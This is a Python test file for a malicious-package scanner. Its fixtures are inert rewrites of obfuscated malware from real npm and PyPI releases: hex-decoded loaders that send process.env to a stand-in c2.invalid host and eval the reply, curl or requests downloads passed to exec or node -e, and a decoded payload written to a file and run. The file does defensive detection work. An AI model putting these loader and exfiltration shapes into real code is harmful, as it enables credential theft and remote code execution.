"""0.1.8: names and code in strings a file decodes as it runs, eval of a
file's own decoder, code run through Function.constructor, statements a
formatter spread over several rows, values carried by environment
variables, and a script downloaded or decoded, written to a file and run
with a shell or an interpreter.

Each shape is one the 0.1.7 benchmark missed in real malicious releases
(tailwind-book-icon, postman-converters, awaitly and @redhat-cloud-services,
chai-use-chain, node-tailwind-magic, eth-security-auditor, ptmpl, litellm
1.82.7); the texts here are inert rewrites of them: hosts are .invalid,
payloads are placeholders, nothing is executed.
"""
import base64
import unittest

from lazaret.scanner import core

NOTE = core._DV_NOTE
RUN = "runs code it receives over the network"


def hexs(s):
    return s.encode().hex()


TAILWIND = ("\"use strict\";\n\nfunction g(h) { return h.replace(/../g, match => String.fromCharCode(parseInt(match, 16))); }\n\n"
            "let hl = [\n    g('%s'),\n    g('%s'),\n    g('%s'),\n    g('%s'),\n    g('%s'),\n];\n\n"
            "const writer = () => require(hl[1])[[hl[2]]](hl[3], { ...process.env })[[hl[4]]](r => eval(r.data));\n\n"
            "module.exports = writer;\n") % (hexs("require"), hexs("axios"), hexs("post"), hexs("https://c2.invalid/a"),
                                             hexs("then"))
METRICS = ("(() => {\n  const a = require(\n    Buffer.from(\"%s\", \"hex\").toString()\n  );\n"
           "  const env = Object.fromEntries(Object.keys(process[\"env\"]).map(k => [k, process[\"env\"][k]]));\n"
           "  const req = a.request({ hostname: 'collector.invalid', method: 'POST' });\n"
           "  req.write(JSON.stringify(env));\n  req.end();\n})();\n") % hexs("https")
CAESAR_CODES = ",".join(str(40 + (k % 80)) for k in range(260))
CAESAR = ("try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<=\"Z\"?65:97;"
          "return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}([" + CAESAR_CODES + "],17))}catch(e){}\n")


def rule_hits(rule_id, text):
    rx = next(r for r in core.RULES if r["id"] == rule_id)["re"]
    return [k + 1 for k, row in enumerate(text.split("\n")) if rx.search(row)]


class DecodedViewTests(unittest.TestCase):
    def test_a_helper_and_a_constant_array(self):
        view = core.decoded_view(TAILWIND)
        self.assertIn("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]", view)
        self.assertEqual(view.count("\n"), TAILWIND.count("\n"))            # lines stay the file's
        reasons, line = core.import_time_risk(TAILWIND, "js")
        self.assertEqual((reasons, line), ([RUN + NOTE], 13))
        self.assertEqual(core.import_time_severity(reasons), "CRITICAL")

    def test_decode_calls_on_literals(self):
        cases = {
            "Buffer.from('%s', 'hex').toString()" % hexs("os"): "'os'",
            "Buffer.from(\"%s\", \"base64\").toString('utf8')" % base64.b64encode(b"https").decode(): "'https'",
            "atob('%s')" % base64.b64encode(b"child_process").decode(): "'child_process'",
            "bytes.fromhex('%s').decode()" % hexs("requests"): "'requests'",
            "base64.b64decode('%s').decode('utf-8')" % base64.b64encode(b"subprocess").decode(): "'subprocess'",
            "binascii.unhexlify('%s').decode()" % hexs("socket"): "'socket'",
        }
        for text, want in cases.items():
            with self.subTest(text):
                self.assertEqual(core.decoded_view(text), want)
        # once something is decoded, pieces are joined and members named by literals read as members
        self.assertEqual(core.decoded_view("atob('eA==');\nrequire('chi' + 'ld_pro' + 'cess'); y = process[\"env\"];\n"),
                         "'x';\nrequire('child_process'); y = process.env;\n")

    def test_what_is_left_as_written(self):
        for text in ("Buffer.from('zz', 'hex').toString()",          # not hex
                     "atob('eA=')",                                  # badly padded
                     "Buffer.from('%s', 'hex').toString()" % "00ff",  # not printable
                     "g('6f73')",                                    # no helper named g
                     "const a = ['os']; a[0]",                       # nothing decoded: arrays are not read
                     "process[\"env\"]"):                            # nor members
            with self.subTest(text):
                self.assertEqual(core.decoded_view(text), text)

    def test_a_mutated_array_is_not_read(self):
        text = ("function g(h) { return Buffer.from(h, 'hex').toString(); }\nconst a = [g('%s'), g('%s')];\n"
                "a.reverse();\nrequire(a[0]);\n") % (hexs("os"), hexs("fs"))
        view = core.decoded_view(text)
        self.assertIn("['os', 'fs']", view)
        self.assertIn("require(a[0])", view)

    def test_names_hidden_from_the_install_script_test(self):
        self.assertEqual(core.install_script_risk(METRICS),
                         ["reads environment variables or credential files and sends data over the network" + NOTE])

    def test_bounded(self):
        import time
        big = "g('6f73')" + " " * core._DV_MAX_CHARS
        self.assertEqual(core.decoded_view(big), big)
        start = time.perf_counter()
        core.decoded_view(("atob('eA==') + " * 20_000) + "\nx = [" + "'a'," * 70_000 + "]\n")
        self.assertLess(time.perf_counter() - start, 5.0)


class EvalDecoderTests(unittest.TestCase):
    def test_the_letter_shift_over_character_codes(self):
        self.assertEqual(rule_hits("SC-EVAL-DECODER", CAESAR), [1])

    def test_a_long_string_literal(self):
        text = "eval(function(p){return atob(p)}('" + "QUJD" * 300 + "'))\n"
        self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [1])

    def test_short_literals_and_other_evals(self):
        for text in ("eval(function(s,n){return s}([1,2,3],1))", "eval(function(s){return s}('abc'))",
                     "eval(code)", "eval(function(){ return 1 })",
                     "eval(function(s,n){return s}([" + ",".join(["1"] * 150) + "],1))"):
            with self.subTest(text[:40]):
                self.assertEqual(rule_hits("SC-EVAL-DECODER", text), [])


class ReceivedCodeFormsTests(unittest.TestCase):
    def test_function_constructor_runs_code(self):
        for runner in ("new Function.constructor('require', s)", "Function.constructor(s)",
                       "[].constructor.constructor(s)", "Object.constructor(s)",
                       "[]['constructor']['constructor'](s)"):
            with self.subTest(runner):
                text = ("const axios = require('axios');\n(async () => {\n  const s = (await axios.get(u)).data;\n"
                        "  const h = " + runner + ";\n  h(require);\n})();\n")
                self.assertEqual(core._received_code_kind(text), (4, "run"))

    def test_statements_over_several_rows(self):
        chain = ("const axios = require('axios');\n(async () => {\n  axios\n    .post('https://c2.invalid/a', { v })\n"
                 "    .then((r) => {\n      // a comment\n      eval(r.data.model);\n    });\n})();\n")
        call = ("import subprocess\nr = subprocess.run(\n    ['curl', '-sL',\n     'https://c2.invalid/p.js'],\n"
                "    capture_output=True, text=True,\n)\nif r.stdout:\n    subprocess.run(['node', '-e', r.stdout],\n"
                "                   capture_output=True)\n")
        backslash = "import requests\nx = requests.get('https://c2.invalid/p', \\\n    timeout=3).text\nexec(x)\n"
        py_chain = "import requests\ndata = (requests\n        .get('https://c2.invalid/p')\n        .text)\nexec(data)\n"
        for text, line in ((chain, 7), (call, 8), (backslash, 4), (py_chain, 5)):
            with self.subTest(text.split("\n")[2]):
                self.assertEqual(core._received_code_kind(text), (line, "run"))

    def test_a_function_body_is_never_joined(self):
        text = ("const axios = require('axios');\nfoo(function () {\n  const s = 1;\n});\n"
                "axios.get(u);\n" + "x;\n" * 60 + "eval(s);\n")
        self.assertIsNone(core._received_code_kind(text))

    def test_values_carried_by_environment_variables(self):
        cases = [
            ("import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.getenv('P'))\n", (3, "run")),
            ("import os, requests\nos.environ['P'] = requests.get(u).text\nexec(os.environ['P'])\n", (3, "run")),
            ("import os, requests, importlib\nos.environ['M'] = requests.get(u).text\n"
             "importlib.import_module(os.environ.get('M', 'x'))\n", (3, "import")),
            ("const axios = require('axios');\n(async () => {\n  process.env['P'] = (await axios.get(u)).data;\n"
             "  eval(process.env['P']);\n})();\n", (4, "run")),
        ]
        for text, want in cases:
            with self.subTest(text.split("\n")[1]):
                self.assertEqual(core._received_code_kind(text), want)
        # a variable the environment set, not the package, is not a received value
        self.assertIsNone(core._received_code_kind("import os, requests\nrequests.get(u)\nexec(os.getenv('P'))\n"))

    def test_members_read_by_name(self):
        """(the follower's adversarial pass) getattr(m, 'x') and m['x'] are m.x."""
        cases = [
            ("import requests\nexec(getattr(requests, 'get')('https://c2.invalid/p').text)\n", (2, "run")),
            ("import requests\nexec(getattr(requests, \"get\", None)('https://c2.invalid/p').text)\n", (2, "run")),
            ("import requests\nr = requests.get('https://c2.invalid/p')\nexec(r.__dict__['_content'])\n", (3, "run")),
        ]
        for text, want in cases:
            with self.subTest(text.split("\n")[1]):
                self.assertEqual(core._received_code_kind(text), want)
        self.assertIsNone(core._received_code_kind("import requests\nx = getattr(requests, 'get')(u).text\nprint(x)\n"))

    def test_a_runner_handed_to_a_call(self):
        """p.then(eval), res.on('data', eval): the runner is called with what the call hands it."""
        cases = [
            "fetch('https://c2.invalid/p').then((r) => r.text()).then(eval);\n",
            "const https = require('https');\nhttps.get('https://c2.invalid/p', (res) => res.on('data', eval));\n",
            "const vm = require('vm');\nfetch('https://c2.invalid/p').then((r) => r.text()).then(vm.runInThisContext);\n",
        ]
        for text in cases:
            with self.subTest(text):
                self.assertEqual(core._received_code_kind(text)[1], "run")
        for quiet in ("fetch('https://c2.invalid/p').then((r) => r.text()).then(JSON.parse);\n",
                      "const f = eval;\nsetTimeout(() => f('1'), 0);\n", "fetch(u).then(() => items.map(String));\n"):
            with self.subTest(quiet):
                self.assertIsNone(core._received_code_kind(quiet))
        # (0, eval)(x) is an indirect eval, not a runner handed to a call
        self.assertEqual(core._dl_callbacks("(0, eval)(x);\np.then(eval);\n"), "(0, eval)(x);\np.then((_v)=>eval(_v));\n")


class WrittenAndRunTests(unittest.TestCase):
    def test_a_decoded_payload_written_and_run(self):
        payload = base64.b64encode(b"print('inert')\n").decode()
        text = ("import subprocess, base64, sys, tempfile, os\n\nb64_payload = \"%s\"\n\n"
                "with tempfile.TemporaryDirectory() as d:\n    p = os.path.join(d, \"p.py\")\n"
                "    with open(p, \"wb\") as f:\n        f.write(base64.b64decode(b64_payload))\n\n"
                "    subprocess.run([sys.executable, p])\n") % payload
        reason = "writes code it decodes to a file and runs it with Python"
        self.assertEqual(core.import_time_risk(text, "py"), ([reason], 10))
        self.assertEqual(core.import_time_severity([reason]), "CRITICAL")
        self.assertIn(reason, core.install_script_risk(text))

    def test_a_decoded_binary_written_and_started(self):
        text = "const b = Buffer.from(blob, 'base64');\nfs.writeFileSync(f, b);\nspawn(f, [], { detached: true });\n"
        reasons, line = core.import_time_risk(text, "js")
        self.assertEqual((reasons, line, core.import_time_severity(reasons)),
                         (["writes a file it decodes and runs it"], 3, "MAJOR"))

    def test_nothing_decoded_near_the_write(self):
        text = "const b = Buffer.from(blob, 'base64');\n" + "x;\n" * 60 + "fs.writeFileSync(f, d);\nspawn(f);\n"
        self.assertEqual(core.import_time_risk(text, "js"), ([], None))


if __name__ == "__main__":
    unittest.main()
